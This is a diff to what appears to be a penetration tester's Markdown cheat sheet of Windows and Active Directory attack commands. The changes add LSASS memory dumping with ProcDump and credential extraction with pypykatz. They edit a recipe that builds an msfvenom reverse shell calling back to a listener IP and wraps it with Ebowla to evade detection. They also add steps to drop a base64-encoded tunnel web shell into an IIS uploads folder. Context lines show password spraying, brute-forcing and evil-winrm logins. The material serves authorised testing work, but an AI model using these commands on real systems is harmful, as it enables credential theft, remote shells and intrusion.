@@ -645,6 +645,22 @@ PS> Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NA
 
 
 
+## Dump Creds
+
+
+
+### ProcDump
+
+* [download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
+
+```
+PS> .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
+$ pypykatz lsa minidump lsass.dmp
+```
+
+
+
+
 ## UAC Bypass
 
 
@@ -763,14 +779,14 @@ PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 ### Ebowla
 
 ```
-root@kali:$ sudo git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
-root@kali:$ sudo apt install golang wine -y
-root@kali:$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
-root@kali:$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
-root@kali:$ vi genetic.config
+$ sudo git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
+$ sudo apt install golang mingw-w64 wine -y
+$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
+$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
+$ vi genetic.config
 ...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
-root@kali:$ python ebowla.py /tmp/rev.exe genetic.config && rm /tmp/rev.exe
-root@kali:$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden]
+$ python ebowla.py rev.exe genetic.config && rm rev.exe
+$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && rm output/go_symmetric_rev.exe.go
 [+] output/ebowla-rev.exe
 ```
 
@@ -1551,7 +1567,7 @@ root@kali:$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
 Run:
 
 ```
-root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
+root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s `pwd` -e `pwd`
 ```
 
 * [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
@@ -1595,14 +1611,26 @@ PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogo
 
 #### Tricks
 
-File transfer:
+Local file to base64:
 
 ```
 Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
 Cmd> type C:\Windows\Temp\encoded.b64
 ```
 
+Full base64 file transfer from Linux to Windows:
+
+```
+root@kali:$ base64 -w0 tunnel.aspx; echo
+...BASE64_CONTENTS...
+PS> Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
+PS > $data = Get-Content -Raw tunnel.b64
+PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert]::FromBase64String($data))
+```
+
 * [PayloadsAllTheThings/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+
+
 
 
 ## PrivEsc
@@ -2302,11 +2330,11 @@ root@kali:$ kerbrute userenum -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclist
 root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -request
 root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
 root@kali:$ kerbrute bruteuser -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
-root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
+root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s `pwd` -e `pwd`
 
 PS> systeminfo
 PS> whoami /priv (whoami /all)
-PS> gci "$env:userprofile" -recurse -af |select fullname
+PS> gci "$env:userprofile" -recurse -force -af |select fullname
 PS> net user
 PS> net user /domain
 PS> net user j.doe /domain
